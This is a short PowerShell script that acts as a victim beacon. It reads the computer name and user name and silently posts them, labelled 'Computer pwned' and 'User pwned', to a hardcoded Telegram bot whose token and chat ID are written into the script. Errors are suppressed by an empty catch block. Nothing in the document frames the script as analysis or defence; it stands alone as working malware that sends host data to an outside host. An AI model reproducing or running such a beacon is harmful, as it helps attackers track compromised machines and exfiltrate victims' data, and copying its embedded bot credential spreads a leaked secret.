# Get the computer name
$computerName = $env:COMPUTERNAME

# Get the user name
$userName = $env:USERNAME

# Construct the message body for the Telegram API
$chatId = "5073190288"
$token = "5876725645:AAEGt_hN-rV-Z8iPr9edvc7e7CtZ2QuSUrg"
$apiUrl = "https://api.telegram.org/bot$token/sendMessage"

$message = @{
    chat_id = $chatId
    text    = "Computer pwned: $computerName`nUser pwned: $userName"
    disable_notification = $true
}

# Send the POST request to the Telegram API
try {
    Invoke-RestMethod -Uri $apiUrl -Method Post -ContentType "application/json" -Body ($message | ConvertTo-Json)
} catch {
    # plm
}